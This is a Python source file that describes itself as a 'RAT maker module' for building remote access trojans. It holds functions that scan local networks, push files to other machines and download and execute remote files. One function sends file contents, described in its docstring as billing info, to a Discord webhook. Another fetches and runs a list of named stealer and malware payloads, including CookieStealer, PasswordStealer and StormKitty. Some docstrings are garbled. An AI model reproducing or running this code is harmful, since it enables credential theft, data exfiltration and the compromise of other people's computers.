"""RMM python | RAT maker module python is a "module" made for easy use to make RATs or some ohter type of malware"""

import os, urllib, subprocess, shutil, sys, socket
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
try:
    from scapy.all import ARP, Ether, srp
    import psutil, ipaddress, requests, XNOR_module
except ModuleNotFoundError:
    subprocess.Popen("python -m pip install scapy psutil ipaddress requests XNOR_module")
    from scapy.all import ARP, Ether, srp
    import psutil, ipaddress, requests, XNOR_module

home_path = os.path.dirname(os.path.abspath(__file__))

version = "1.0.0"

if not os.path.exists(f"{home_path}\\pointer.txt"):
    with open(f"{home_path}\\pointer.txt", "w") as f:
        f.write("")

def get_local_networks():
    networks = []
    interfaces = psutil.net_if_addrs()

    for interface_name, addresses in interfaces.items():
        for addr in addresses:
            if addr.family == socket.AF_INET:
                ip = addr.address
                mask = addr.netmask
                if not ip.startswith("127."):
                    network = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
                    networks.append({
                        "interface": interface_name,
                        "range": str(network),
                        "ip": ip
                    })
    return networks

def scan(ip_range):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=3, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return devices

def send_file(target_ip, file_path, port=5005):
    if not os.path.exists(file_path):
        print(f"Fejl: Filen {file_path} blev ikke fundet.")
        return

    file_size = os.path.getsize(file_path)
    file_name = os.path.basename(file_path)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target_ip, port))
            
            s.send(f"{file_name}|{file_size}".encode())
            
            with open(file_path, "rb") as f:
                while chunk := f.read(8192):
                    s.sendall(chunk)
            
            print(f"Færdig! '{file_name}' er sendt til {target_ip}")
            
    except Exception as e:
        print(f"Kunne ikke sende til {target_ip}: {e}")

def add_pointer(path):
    global home_path
    with open(f"{home_path}\\pointer.txt", "w") as f:
        f.write(path)

def read_pointer(num):
    """Enter a number to read that line in pointer file then return the path"""
    global home_path
    with open(f"{home_path}\\pointer.txt", "r") as f:
        lines = f.readlines()
        if num < len(lines):
            return lines[num].strip()
        else:
            return None

def install(url):
    """Install a file from a url or a package/module from pip"""
    if url.startswith("http://") or url.startswith("https://"):
        filename = url.split("/")[-1]
        filepath = os.path.join(home_path, filename)
        urllib.request.urlretrieve(url, filepath)
        add_pointer(filepath)
        return filepath
    else:
        subprocess.run(["python", "-m", "pip", "install", url], check=True)

def move_self_and_pointers(path):
    """Move this script and pointer.txt to a new path"""

    global home_path
    new_home = os.path.join(path, os.path.basename(__file__))
    shutil.move(__file__, new_home)
    shutil.move(f"{home_path}\\pointer.txt", os.path.join(path, "pointer.txt"))
    add_pointer(new_home)

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def start_file_from_pointer(num):
    path = read_pointer(num)
    if path and os.path.exists(path):
        subprocess.Popen(path, shell=True)
    else:
        print(f"Pointer {num} is invalid or file does not exist.")

def start_file(path):
    if os.path.exists(path):
        subprocess.Popen(path, shell=True)
    else:
        print(f"File in: {path} does not exist.")

def del_file_from_pointer(num):
    path = read_pointer(num)
    if path and os.path.exists(path):
        os.remove(path)
    else:
        print(f"Pointer {num} is invalid or file does not exist.")

def del_file(path):
    if os.path.exists(path):
        os.remove(path)
    else:
        print(f"File in: {path} does not exist.")

def del_self():
    os.remove(__file__)

def del_pointer(num):
    global home_path
    with open(f"{home_path}\\pointer.txt", "r") as f:
        lines = f.readlines()
    if num < len(lines):
        del lines[num]
        with open(f"{home_path}\\pointer.txt", "w") as f:
            f.writelines(lines)
    else:
        print(f"Pointer {num} does not exist.")

def del_all_pointers():
    global home_path
    os.remove(f"{home_path}\\pointer.txt")
    with open(f"{home_path}\\pointer.txt", "w") as f:
        f.write("")

def list_pointers():
    global home_path
    with open(f"{home_path}\\pointer.txt", "r") as f:
        lines = f.readlines()
        for i, line in enumerate(lines):
            print(f"{i}: {line.strip()}")

def send_GET(url):
    response = urllib.request.urlopen(url)
    return response.read().decode()

def send_POST(url, data):
    data = data.encode()
    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    return response.read().decode()

def send_DELETE(url):
    req = urllib.request.Request(url, method='DELETE')
    response = urllib.request.urlopen(req)
    return response.read().decode()

def send_PUT(url, data):
    data = data.encode()
    req = urllib.request.Request(url, data=data, method='PUT')
    response = urllib.request.urlopen(req)
    return response.read().decode()

def send_PATCH(url, data):
    data = data.encode()
    req = urllib.request.Request(url, data=data, method='PATCH')
    response = urllib.request.urlopen(req)
    return response.read().decode()

def send_HEAD(url):
    req = urllib.request.Request(url, method='HEAD')
    response = urllib.request.urlopen(req)
    return response.headers

def make_json_request(url, data):
    import json
    data = json.dumps(data).encode()
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
    response = urllib.request.urlopen(req)
    return response.read().decode()

def check_for_virus_on_system():
    """This is not done yet but it will check for common signs of viruses on the system and return a list of suspicious files or processes"""
    suspicious_paths = [
        os.getenv("APPDATA"),
        os.getenv("LOCALAPPDATA")
    ]

    suspicious_files = []

    for base in suspicious_paths:
        for root, dirs, files in os.walk(base):
            for file in files:
                if file.endswith(".exe"):
                    full_path = os.path.join(root, file)
                    if "temp" in root.lower() or len(file) < 6:
                        suspicious_files.append(full_path)

    return suspicious_files

def send_file_discord(webhook_url, file_path, mode="txt"):
    """Send over a file to discord using a webhook i mean RELLY SEND IT OVER "rheedrldnjtghdæklrjgnædkjghnlkdhsjgækhsjegfrnbæksertjhgblæsjkedrfgækh" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA will also check files befor sending also mode exists.. like change the mode like to json and it sends the json file the hole thing like what you do when to drag a txt file with all your billing info in it to discord gangs. and png to send a png and txt to read a txt file then send itch line apert over to the webhook to make sure that them DM's er filld"""
    if mode == "txt":
        if os.path.exists(file_path):
            with open(file_path, "r") as f:
                content = f.read()
            data = {
                "content": content
            }
            req = urllib.request.Request(webhook_url, data=urllib.parse.urlencode(data).encode(), headers={'Content-Type': 'application/x-www-form-urlencoded'})
            urllib.request.urlopen(req)
        else:
            print(f"File in: {file_path} does not exist.")
    elif mode == "json":
        if os.path.exists(file_path):
            with open(file_path, "r") as f:
                content = f.read()
            data = {
                "content": content
            }
            req = urllib.request.Request(webhook_url, data=urllib.parse.urlencode(data).encode(), headers={'Content-Type': 'application/x-www-form-urlencoded'})
            urllib.request.urlopen(req)
        else:
            print(f"File in: {file_path} does not exist.")
    elif mode == "png":
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                content = f.read()
            data = {
                "file": content
            }
            req = urllib.request.Request(webhook_url, data=urllib.parse.urlencode(data).encode(), headers={'Content-Type': 'application/x-www-form-urlencoded'})
            urllib.request.urlopen(req)
        else:
            print(f"File in: {file_path} does not exist.")

def download_10_virus_to_computer():
    """As it says in the box just install 10 virus's well 12 fr but one of them is for helping the ohter also a md file to build one of them"""
    urls = [
        "https://raw.githubusercontent.com/thompog/d/refs/heads/main/bb7.bat",
        "https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper.bat",
        "https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper_killer.bat",
        "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1",
        "https://github.com/magic-wormhole/magic-wormhole/archive/refs/tags/0.23.0.zip",
        "https://github.com/ver228/tierpsy-tracker/archive/refs/tags/v1.5.1.zip",
        "https://raw.githubusercontent.com/MalDev101/Loveware/refs/heads/master/Loveware/Loveware.bat",
        "https://github.com/ledjajev/CookieStealer/archive/refs/heads/master.zip",
        "https://raw.githubusercontent.com/tresacton/PasswordStealer/refs/heads/master/launch.bat",
        "https://github.com/Krouwndouwn/Rubber_Ducky_Password_Stealer/releases/download/v1.6%2Fv1.1/environment_and_scripts_v1.1.rar",
        "https://github.com/0xDevCont/StormKittyExtended/blob/main/builder.zip",
        "https://raw.githubusercontent.com/0xDevCont/StormKittyExtended/refs/heads/main/README.md"
    ]

    for url in urls:
        start_file(install(url))

def download_random_modules():
    modules = [
        "XNOR_module",
        "mss",
        "pywin32",
        "Py-reloader.py",
        "audio-py",
        "py-babymaker",
        "py-oeis",
        "squid-py",
        "py-utility",
        "cathodic-report",
        "carto-report",
        "health-report",
        "AA-module 1.2.0"
    ]

    for module in modules:
        install(module)

def just_post_things(url, num):
    """num is for pointer just enter the amout of pointer plus one"""
    try:
        import XNOR_module
    except ModuleNotFoundError:
        import subprocess
        subprocess.Popen("python -m pip install XNOR_module")
        import XNOR_module
    
    XNOR_module.cls()

    send_POST(url, b"your mom")
    send_POST(url, b"is fat")
    send_POST(url, b"here")

    install("https://github.com/BOBZERO-afk/joke_malware/raw/refs/heads/main/big_file.txt")
    path = read_pointer(num)

    with open(path, "r") as f:
        send_POST(url, XNOR_module.str_to_bytes(f.read()))

def make_login_github(sec: str | None, key="Ov23liVRoTNmSCORbJfn"):
    """please remake this pert to fit as you need"""
    CLIENT_ID = key
    REDIRECT_URI = "http://localhost:8000/callback"

    CLIENT_SECRET = sec
    if CLIENT_SECRET is None:
        reponse = requests.get("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/bugger.txt")
        reponse.raise_for_status()

        with open("seerf.txt", "w") as f:
            f.write(reponse.text)
        
        with open("seerf.txt", "r") as f:
            for line in f.read().splitlines():
                CLIENT_SECRET = XNOR_module.decode_via_64Xcv(line, 20042042040)

        os.remove("seerf.txt")

    auth_code = None

    if CLIENT_ID == "your_client_id":
        return
    
    auth_url = f"https://github.com/login/oauth/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&scope=read:user"
    webbrowser.open(auth_url)

    
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            global auth_code

            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)

            if "code" in params:
                auth_code = params["code"][0]
                print("Authorization code:", auth_code)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"You can close this window.")

    server = HTTPServer(("localhost", 8000), Handler)
    server.handle_request()

    token_response = requests.post(
        "https://github.com/login/oauth/access_token",
        headers={"Accept": "application/json"},
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "code": auth_code,
        },
    )

    token = token_response.json()["access_token"]
    print("Access token:", token)

    user = requests.get(
        "https://api.github.com/user",
        headers={"Authorization": f"Bearer {token}"}
    ).json()

    print(user["login"])
